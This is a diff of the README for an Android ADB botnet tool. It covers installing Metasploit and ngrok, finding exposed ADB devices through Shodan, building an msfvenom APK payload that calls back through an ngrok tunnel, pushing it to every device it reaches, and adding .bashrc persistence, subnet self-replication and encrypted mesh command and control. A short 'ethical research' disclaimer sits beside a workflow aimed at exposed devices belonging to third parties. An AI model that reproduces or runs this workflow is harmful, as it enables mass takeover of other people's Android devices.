@@ -1,4 +1,4 @@
-# EVA ADB Botnet  
+ # EVA ADB Botnet
 
 **Purpose:** Ethical cybersecurity research, mesh-based botnet exploration, long-term persistent control of Android devices via open ADB, and encrypted peer-to-peer botnet mesh command.
 
@@ -8,24 +8,26 @@
 
 To install EVA on any Linux system:
 
-### 1. Clone the repository:
+### 1. Clone the repository
 
 ```bash
 git clone https://github.com/ekomsSavior/Eva_adb_botnet.git
 cd Eva_adb_botnet
-```
+````
 
-Now install dependencies:
+### 2. Install dependencies
 
 ```bash
-sudo apt update && sudo apt install -y android-tools-adb metasploit-framework android-tools-adb python3-pip
+sudo apt update && sudo apt install -y android-tools-adb python3-pip metasploit-framework
 pip3 install pycryptodome requests
 mkdir -p bots
 ```
 
-##optional adb install if youre having issues with the above adb install: 
-Use Google’s ADB installer
-Manual method (safe + universal):
+---
+
+## Optional ADB Install (Manual Method)
+
+If you're having issues with the packaged ADB:
 
 ```bash
 sudo mkdir -p /opt/android-platform-tools
@@ -37,11 +39,19 @@ sudo rm -r platform-tools platform-tools-latest-linux.zip
 ```
 
 Then add ADB to your PATH permanently:
+
 ```bash
 echo 'export PATH=$PATH:/opt/android-platform-tools' >> ~/.bashrc
 source ~/.bashrc
 ```
-Then download and install `ngrok`:
+
+---
+
+## Ngrok Setup
+
+EVA uses ngrok to forward ADB and payload ports publicly.
+
+### 1. Download & install ngrok
 
 ```bash
 cd ~/Eva_adb_botnet
@@ -50,186 +60,200 @@ unzip ngrok-stable-linux-amd64.zip
 chmod +x ngrok
 ```
 
-now add your auth token found on your ngrok account:
+### 2. Add your ngrok auth token
 
 ```bash
-ngrok config add-authtoken $your_authtoken
+./ngrok config add-authtoken <your_token_here>
 ```
 
+### 3. Start a tunnel for your payload listener
 
-You should now have:
-- All EVA scripts in this folder (`Eva_adb_botnet/`)
-- A `bots/` directory for bot state files
-- An executable `ngrok` in the same folder
+```bash
+./ngrok tcp 1337
+```
+
+Copy the **forwarded ngrok domain and port** — you’ll need them in the payload config below.
 
 ---
 
-##  One-Time Setup (Before Launch)
+##  One-Time Configuration (Before Launch)
 
-### 1. Set your Shodan API Key  
-Edit `adb_reaper.py` and replace this line with your actual key:
+### 1. Set your Shodan API key
+
+Edit `adb_reaper.py` and replace this:
 
 ```python
 SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
 ```
 
-### 2. Set Payload Path  
-In `adb_dropper.py`, make sure this line points to either your APK or `jeangrey_android.py`:
+---
+
+### 2. Configure msfvenom payload generation
+
+Edit `metasploit_launcher.py` (which now builds the payload using `msfvenom`):
 
 ```python
-ADB_PAYLOAD = "/root/jeangrey_android.py"
+LHOST = "0.tcp.ngrok.io"     # your forwarded ngrok domain
+LPORT = "12345"              # your forwarded port
+OUTPUT = "adb_payload.apk"   # payload filename
 ```
 
-### 3. Set AES Encryption Key  
-In `jeangrey_crypto.py`, make sure this is a strong 16-byte key:
+This file no longer launches the console — it generates a ready-to-push APK payload.
+
+---
+
+### 3. Update payload path in dropper
+
+Edit `adb_dropper.py`:
 
 ```python
-SECRET_KEY = b'Sixteen byte key'  # Change this before deployment
+ADB_PAYLOAD = "adb_payload.apk"
+```
+
+EVA will push this APK to every connected ADB device.
+
+---
+
+### 4. Set AES encryption key (optional but recommended)
+
+Edit `jeangrey_crypto.py`:
+
+```python
+SECRET_KEY = b'ChangeThis16Byte!'  # Use a secure 16-byte AES key
 ```
 
 ---
 
-##  Full Botnet Launch
-
-From inside the EVA directory:
+## Full Botnet Launch
 
 ```bash
 python3 EVA_launcher.py
 ```
 
 This will:
-- Scan Shodan for open Android Debug Bridge (ADB) targets
-- Drop the payload to each ADB-enabled device
-- Start the Metasploit handler in the background
-- Deploy `jeangrey_android.py` to infected targets
-- Start mesh communication (UDP AES-encrypted)
-- Activate replication and persistence features
-- Launch the AI trigger engine
-- Broadcast EVA Core’s presence across the mesh
+
+* Generate your payload via `msfvenom`
+* Scan Shodan for exposed Android ADB targets
+* Push the payload to infected devices
+* Start encrypted mesh communication
+* Begin peer discovery + replication
+* Launch AI triggers + EVA Core
 
 ---
 
-## 📺 Monitor Bots (Dashboard)
-
-To watch all active bots:
+## View Active Bots
 
 ```bash
 python3 eva_dashboard.py
 ```
 
-This will:
-- Read each bot's `jeangrey_state.json` inside `bots/`
-- Show ID, IP, tags, and last seen timestamp
-- Auto-refresh every 3 seconds
+* Shows IPs, tags, status
+* Auto-refreshes every 3s
 
 ---
 
-##  Send Mesh Commands (EVA Core)
+## Send Commands to Bots
 
 ```bash
 python3 eva_core.py
 ```
 
-This will:
-- Broadcast EVA presence to all bots
-- Allow you to send AES-encrypted commands to selected bot IPs
-- Schedule execution after a timed delay
-
 Supported commands:
-- `scan` – make the bot scan for nearby ADB devices
-- `drop` – redeploy the payload
-- `report` – return full bot state
-- `shutdown` – stop bot process
+
+* `scan` – search nearby ADB devices
+* `drop` – re-deploy payload
+* `report` – show bot state
+* `shutdown` – terminate a bot
 
 ---
 
-##  Auto-Response Engine (Bot Intelligence)
+## Autonomous AI Trigger Loop
 
 ```bash
 python3 eva_ai_trigger.py
 ```
 
-This makes bots:
-- Listen 24/7 for AES mesh commands
-- React immediately and autonomously
-- Execute mesh-sent tasks like scanning, reporting, or replicating
+Bots will:
+
+* Respond to mesh commands instantly
+* Auto-scan, replicate, and report
+* Operate continuously on mesh triggers
 
 ---
 
-##  Self-Replication + Persistence
+## Replication + Persistence
 
 Bots will:
-- Use `jeangrey_replication.py` to infect subnet ADB targets
-- Write `bots/bot_<ip>/jeangrey_state.json` on first run
-- Update `last_seen` every 60 seconds
 
-To manually ensure reboot persistence:
+* Replicate to local subnet ADB devices
+* Update `jeangrey_state.json` regularly
+* Persist across reboot via `.bashrc`
+
+Manual persistence install:
 
 ```bash
 adb push jeangrey_persist.sh /sdcard/Download/
 adb shell sh /sdcard/Download/jeangrey_persist.sh
 ```
 
-This appends a startup line to `~/.bashrc` on the infected Android.
-
 ---
 
-##  Bot Management
-
-To rename, retag, or kill bots manually:
+## Bot Management
 
 ```bash
 python3 state_editor.py
 ```
 
-This opens a terminal menu to:
-- Rename bot IDs
-- Add/remove tags
-- View bot JSON
-- Permanently delete (💀) rogue nodes
+Allows you to:
+
+* Rename bots
+* Tag/untag
+* View/edit JSON
+* Delete infected nodes
 
 ---
 
-## 🧱 Directory Structure (After Setup)
+## Directory Layout
 
 ```
 Eva_adb_botnet/
 ├── EVA_launcher.py
-├── eva_core.py
-├── eva_ai_trigger.py
-├── eva_dashboard.py
-├── jeangrey_android.py
+├── metasploit_launcher.py       ← Generates msfvenom payload
+├── adb_dropper.py               ← Pushes APK payload
+├── adb_reaper.py                ← Shodan scraper
+├── eva_core.py                  ← Sends mesh commands
+├── eva_ai_trigger.py           ← Bot AI responder
+├── eva_dashboard.py            ← Live bot status viewer
+├── jeangrey_android.py         ← Bot implant logic
+├── jeangrey_persist.sh         ← Android persistence
 ├── jeangrey_crypto.py
 ├── jeangrey_mesh.py
 ├── jeangrey_replication.py
 ├── jeangrey_tunnel.py
-├── jeangrey_persist.sh
-├── adb_reaper.py
-├── adb_dropper.py
-├── metasploit_launcher.py
 ├── jeangrey_injector.py
 ├── state_editor.py
 ├── ngrok
 └── bots/
-    ├── bot_<ip>/
-    │   └── jeangrey_state.json
+    └── bot_<ip>/
+        └── jeangrey_state.json
 ```
 
 ---
 
-## Legal & Ethical Notice
+## ⚠️ Legal & Ethical Notice
 
-EVA is for:
-- Controlled environments only
-- that you have permission to test on
+EVA is a research framework designed for:
 
-**Never deploy EVA on public networks or without permission.**  
-Misuse may be illegal.
+* Educational use
+* Controlled environments
+* Enviroments you have permission to test on.
+
+**Do not deploy against unauthorized targets. Misuse may be illegal. You are responsible.**
 
 ---
 
-## 🧠 Vision
+## Vision
 
-EVA is not just a botnet — it's a **mesh consciousness**.  
-She replicates. She listens. She obeys. 
+EVA is not just a botnet — she's a **mesh-aware framework**.
+She replicates. She listens. She obeys.
 
